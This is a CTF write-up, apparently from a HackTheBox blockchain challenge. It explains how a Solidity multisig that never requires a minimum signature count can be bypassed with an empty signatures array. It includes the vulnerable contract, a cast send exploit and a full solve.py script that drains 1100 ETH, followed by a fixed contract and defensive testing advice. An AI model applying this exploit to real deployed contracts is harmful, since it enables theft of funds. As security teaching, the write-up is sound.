---
layout: post
title: "Funds Secured"
date: 2027-10-10 09:00:00 -0500
categories: [HackTheBox, Challenges, Blockchain]
tags: [hackthebox, challenge, blockchain, solidity, multisig, access-control, selfdestruct, cwe-863]
description: "An Easy Blockchain challenge where a 6-of-11 multisig wallet forgets to require a minimum number of signatures — so an empty signatures array walks straight past the quorum and selfdestructs 1100 ETH to you."
---

## Overview

*Funds Secured* is an Easy **Blockchain** challenge. A crowdfunding contract holds **1100 ETH**, and an 11-member council multisig is the only thing allowed to finalize the campaign and move the money. The intended path is "collect 6 of 11 council signatures." The bug: the multisig never actually *requires* 6 signatures — it only validates the ones you hand it. Hand it an **empty array** and the whole signature scheme is skipped, letting you `selfdestruct` the funds to your own address with zero valid signatures. This is a textbook [CWE-863](https://cwe.mitre.org/data/definitions/863.html) — incorrect authorization, an access-control check that is never enforced.

## The technique

The goal comes from `Setup.isSolved()`:

```solidity
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

So we need to empty the `Crowdfunding` (TARGET) contract. The only function that moves its funds is owner-gated:

```solidity
function closeCampaign(address to) public {
    require(msg.sender == owner, "Only owner");   // owner == the CouncilWallet
    selfdestruct(payable(to));                    // sends ALL ETH to `to`
}
```

`owner` is the `CouncilWallet`, so we have to go *through* the wallet. Here is its finalize function — supposedly a 6-of-11 multisig:

```solidity
function closeCampaign(bytes[] memory signatures, address to, address payable crowdfundingContract) public {
    address[] memory voters = new address[](6);
    bytes32 data = keccak256(abi.encode(to));

    for (uint256 i = 0; i < signatures.length; i++) {        // loops over WHAT YOU SUPPLY
        address signer = data.toEthSignedMessageHash().recover(signatures[i]);
        require(signer != address(0), "Invalid signature");
        require(_contains(councilMembers, signer), "Not council member");
        require(!_contains(voters, signer), "Duplicate signature");
        voters[i] = signer;
        if (i > 5) break;                                    // the ONLY "quorum" logic
    }

    Crowdfunding(crowdfundingContract).closeCampaign(to);    // runs unconditionally after the loop
}
```

The "6 signatures" requirement lives **nowhere except** `if (i > 5) break;`. There is no `require(signatures.length >= 6)`. Every validation step — signature recovery, council-membership, duplicate check — sits *inside the loop body*. Pass an empty array and:

- `signatures.length == 0` → the `for` loop runs **zero times**.
- None of the `require`s are ever evaluated.
- Execution drops straight to `Crowdfunding(crowdfundingContract).closeCampaign(to)`.

Because that call originates from inside `CouncilWallet`, `msg.sender` *is* the owner — so the inner ownership check passes and `selfdestruct` ships all 1100 ETH wherever we point it.

You can't forge real council signatures anyway: members are addresses `0x1`..`0xA`, and recovering a *chosen* address out of a crafted ECDSA signature is computationally infeasible. The empty array doesn't break the signatures — it skips them entirely.

## Solution

The challenge handler hands you a player key and the contract addresses, and the JSON-RPC lives on the same port (a local anvil node, chain id 31337). The exploit is a single `cast send`:

```bash
cast send <wallet> 'closeCampaign(bytes[],address,address)' '[]' <to> <crowdfunding> \
  --private-key <pk> --rpc-url <rpc>
```

The full, copy-pasteable `solve.py`:

```python
import json, subprocess, urllib.request

HANDLER = "http://<ip>:<port>"      # connection_info + JSON-RPC + /flag

# 1. Pull per-instance connection info (player key + contract addresses)
info   = json.load(urllib.request.urlopen(f"{HANDLER}/connection_info"))
PK, ME = info["PrivateKey"], info["Address"]
TARGET = info["TargetAddress"]      # Crowdfunding (holds the funds)
WALLET = info["walletAddress"]      # CouncilWallet (== Crowdfunding.owner)
SETUP  = info["setupAddress"]

def cast(*a):
    return subprocess.check_output(["cast", *a, "--rpc-url", HANDLER]).decode().strip()

print("balance pre :", cast("balance", TARGET), "wei")   # 1100000000000000000000

# 2. Exploit: empty signatures[] -> no quorum check -> selfdestruct to us
subprocess.check_call([
    "cast", "send", WALLET, "closeCampaign(bytes[],address,address)",
    "[]", ME, TARGET, "--private-key", PK, "--rpc-url", HANDLER,
])

print("balance post:", cast("balance", TARGET), "wei")              # 0
print("isSolved    :", cast("call", SETUP, "isSolved()(bool)"))     # true

# 3. Flag is served once isSolved() is true
print(urllib.request.urlopen(f"{HANDLER}/flag").read().decode())    # HTB{...}
```

Running it drains the target from `1100 ether` to `0 wei`, `isSolved()` flips to `true`, and `/flag` returns `HTB{...}`.

## Why it worked

The developer assumed "the loop processes up to 6 signatures" was the same as "6 signatures are required." It isn't. A loop that *can* validate six items does not *demand* six items, and the `break` that caps it only fires if the loop body runs at all. The quorum was an emergent side effect of iterating, not an enforced invariant — and an empty input made it evaporate. The flag spells it out: `wh0_c0u1d_7h1nk_7h47_y0u_c4n_53nd_4n_3mp7y_1157`.

## Fix / defense

Make the threshold an explicit precondition, and count **valid** signers instead of relying on the loop length:

```solidity
function closeCampaign(bytes[] memory signatures, address to, address payable c) public {
    require(signatures.length >= THRESHOLD, "Insufficient signatures");   // gate up front
    address[] memory voters = new address[](THRESHOLD);
    bytes32 data = keccak256(abi.encode(to));
    uint256 valid = 0;
    for (uint256 i = 0; i < signatures.length && valid < THRESHOLD; i++) {
        address signer = data.toEthSignedMessageHash().recover(signatures[i]);
        require(signer != address(0) && _contains(councilMembers, signer) && !_contains(voters, signer));
        voters[valid++] = signer;
    }
    require(valid >= THRESHOLD, "Quorum not met");                        // confirm AFTER
    Crowdfunding(c).closeCampaign(to);
}
```

The defensive habit worth keeping: for any **M-of-N / threshold / voting loop**, the first test case is always the **empty (or short) input array**. If the privileged action still fires, the threshold isn't being enforced.
